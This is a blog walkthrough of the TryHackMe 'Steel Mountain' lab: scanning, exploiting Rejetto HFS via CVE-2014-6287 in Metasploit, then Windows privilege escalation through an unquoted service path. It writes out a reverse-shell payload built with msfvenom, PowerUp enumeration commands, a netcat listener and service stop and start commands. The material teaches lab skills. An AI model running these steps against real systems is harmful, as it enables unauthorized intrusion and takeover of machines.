---
id: 524
title: "Tryhackme Steel Mountain - Walkthrough"
created: 2023-07-06T15:37:03+00:00
url: https://hacklido.com/blog/524-tryhackme-steel-mountain-walkthrough
words: 1786
---

# Tryhackme Steel Mountain - Walkthrough

[image]

This time on tryhackme we will be looking on mr.robot style hacking, yes you heard it right, we will be hacking our way into the steel mountain similar to how Elliot does in the mr.robot series. Although the hacks we will be performing will be slightly different from fixing in raspberry pi, we will be having a lot of fun, and learn something useful along the way. Sound fun right? let’s get started.

# Task 1- Introduction

Question

- Who is the employee of the month?

For this, one can either download the image, and then upload on to reverse image search websites on google, but that is not fun, we will be installing an plugin on firefox called '‘search by image’'.  There are other plugins but we will be sticking to this one.

[image]

After successfully installing the plugin, just right click the image from the website on tryhackme machine which you have deployed, you must see an option called as `**search by image**` and after selecting that you should see an option called as `open image`

turns out that just by seeing the name of the image we are able to tell the answer and turns out there is no need for reverse image search.

```
`Bill Harper`
```

[image]

# Task 2 Initial Access

In this task, we will quickly scan our machine, check for any vulnerabilities, and quickly exploit it using msfconsole. Without wasting our time, let’s carry out  https://hacklido.com/blog/496-attackerkb-source-tryhackme-walk-through#1-Discovering-the-lay-of-the-land--scanning-and-enumeration%5D- our classic rustscan scan, if you don’t understand something refer to this section

```
`sudo rustscan  --ulimit 15000 -a 10.10.144.11  -- -A -sS --top-ports 1024 --script=vuln -oX steelmountain.xml --reason --stats-every 5s`
```

[image]

Now once the scan get’s completed, the output would have been saved into an .xml file now this is convenient because using an utility called `xsltproc` we can convert .xml files into .html and open our favourite web - browser to view the scan results in more understandable format.

```
`xsltproc steelmountain.xml -o steelmountain.html`
```

[image]

[image]

As you can see that this machine is also vulnerable to some other vulnerabilities and we some some random open ports, we have also detected operating system used but do note that there is another web server running at port `8080` do have look, as this web server is running `Rejetto HTTP File Server` version 2.3 which we will be attacking using  `cve-2014-6287`. To know more about this cve, check out these urls/links.

 https://www.exploit-db.com/exploits/39161 https://www.exploit-db.com/exploits/39161

 https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/ https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/

 https://nvd.nist.gov/vuln/detail/CVE-2014-6287 https://nvd.nist.gov/vuln/detail/CVE-2014-6287

Questions

- Scan the machine with nmap. What is the other port running a web server on?

```
`8080`
```

Hint- Refer to rustscan output …

- Take a look at the other web server. What file server is running?

```
`Rejetto HTTP File Server`
```

[image]

- What is the CVE number to exploit this file server?

```
`2014-6287`
```

[From exploit db]

- Use Metasploit to get an initial shell. What is the user flag?

```
`Exploit your way in, answer redacted`
```

 https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/ If in doubt refer this link make sure that you use `exploit/windows/http/rejetto_hfs_exec` module, and set your lhost, rhost [tryhackme machine ip], and rport [8080]. Make sure that you leave lhost to default and hit `run` or `exploit -j`. In some cases if the exploit is successful and you are returned empty prompt, check your sessions something might be there in it.

[image]

[image]

# Task 3 Privilege Escalation

Now since we got initial shell, let’e enumerate the services, for any vulnerabilities, and escalate our privileges. Powersploit has a collection of powershell scripts for recon, enumeration, and for privilege escalation, we will be using `PowerUp.ps1` script, from it’s privesc section for this task.  https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 You can always get this repository from using this link

I have downloaded the whole powersploit directory, [cloned from the git] into a directory called tools for easy access, and for future uses, in case if I have to rely on other tools from this framework.

## Enumeration

```
`mkdir tools
cd tools
git clone https://github.com/PowerShellMafia/PowerSploit/`
```

 But enumeration before that make sure you have uploaded this PowerUp.ps1 tool into your victim machine.  For this take a note on where this file is located and simply use `upload` command to do so. In my case the command looks like the following, make sure you find the location of where PowerUp.ps1 is located in your machine using `pwd` command and make note of it.

[image]

```
`upload /home/mccleod1290/tools/PowerSploit/Privesc/PowerUp.ps1`
```

[image]

Now without any typos, copy these commands. Make no mistake in syntax as it can lead to hours of time waste.

```
`load powershell
powershell_shell
. .\PowerUp.ps1
Invoke-AllChecks`
```

Note that the way to call up an powershell executable file in powershell is via `. .\Filename.ps1` and also do note that`Invoke-AllChecks` is a function that runs all the checks included in the module. Now you should see something like this in the output.

[image]

Questions

- Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

```
`AdvancedSystemCareService9`
```

## Info on unquoted service paths

I did not ever thought the importance of understanding each type or vulnerability in detail, often I used to view the basic syntax, if it works then well and good move on to next task, but this time, this one mistake and old habit of mine costed almost more than 1 hour of my time. Had I understood what and how this vulnerability works, and paid more attention to the room instruction things would have been much quicker.

In simplest terms, it’s a misconfiguration in folder’s or directory’s path which contains extra spaces and if this remains unquotes, then hacker can inject his malicious program into these spaces. This  https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae link explains this vulnerability in depth so feel free to check this out. Additionally feel free to check this  https://www.youtube.com/watch?v=Yt6OZtTVcqk youtube video by hackersploit and this  https://www.youtube.com/watch?v=WWE7VIpgd5I youtube video by conda to know more in detail and how to exploit this vulnerability. These extra spaces, when typed into command prompt or in powershell without quotes, will make system run all the executable of files until it finds the specified one. Again both hackersploit and conda does an amazing job on explaining these vulnerabilities.

 https://tryhackme.com/room/quotient Additionally there is a tryhackme room on this same vulnerability feel free to check out.

For this room, we have found that `AdvancedSystemCareService9` program is un-quoted path, therefore, in place of this program, we will be launching out our own metasploit payload generated by msfvenom, put into the path of `AdvancedSystemCareService9`, stop the service, run our payload, and the restart the `AdvancedSystemCareService9` service will give us reverse shell.

Now take a few moments of your time, read it until you are comfortable, for there is no other way to gain root access using msfvenom payload. Putting it some other directory will not work, not stopping the service before payload execution will also not work and lastly you don’t have enough privileges to migrate spoolsv process. So this is only the way and this is the most important step, re-read as many times as you want the highlighted text until you become comfortable with it.

## Privilege escalation

Create a process with any name you want using msfvenom, we will be using the following command to generate payload encoded with `shikata_ga_nai` . Our command will look something like this.

```
`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
```

[image]

```
`upload /home/mccledo1290/steelmountain/Advanced.exe`
```

Now in order to stop services using windows command line utilities like `sc` you need to invoke the shell from meterpreter which you can do by the following command.

```
`shell`
```

Since we already know the name of the service we need to stop you can directly use sc stop command, but it’s good to know that `sc query` displays all the services running. Note that you are in `C:\Program Files (x86)\IObit\Advanced SystemCare` folder, if not no matter what you do everything will fail.

[image]

Now before we stop the `AdvancedSystemCareService9`, run our metasploit program and then re-run `AdvancedSystemCareService9` , make sure you have either netcat or metasploit mult-handler running in the background. You can run netcat using `nc -nlvp 5555` as we have specified port `5555` or use exploit/multihandler from  https://www.rapid7.com/db/modules/exploit/multi/handler/ metasploit which you can setup easily using the reference in this link Now it’s time to stop the service, run our payload and to restart the service, all done while having an reverse shell listener [netcat or metasploit].

```
`sc stop AdvancedSystemCareService9
start Advanced.exe
sc start AdvancedSystemCareService9`
```

[image]

If you have done everything without skipping one single step then you should get reverse-shell. In my case I have used exploit/multihandler. You can use anything which you find easy to use.

[image]

[image]

Now, since we found `user.txt` in `C:\Users\bill\Desktop` we may find `root.txt` in `C:\Users\Administrator\Desktop`.

Questions

- What is the root flag?

[image]

# Task 4 Without metasploit

Now this is a fairly long blog, and documenting steps without msf requires a lot of extra time, and most importantly extra effort to re-document the whole process from initial access to privilege escalation and to access both `user.txt` and `root.txt` files. Instead for now let’s wrap up this writeup with only the question.

Questions

- What powershell -c command could we run to manually find out the service name?

Format is "powershell -c “command here”

```
`powershell -c "Get-Service"`
```

[image]

There maybe or maybe a walk-through without using msf, and if you folks want an walk-through without msf, do let me know else I will not moving on to the next tryhackme machines as usual. Until then, keep hacking !
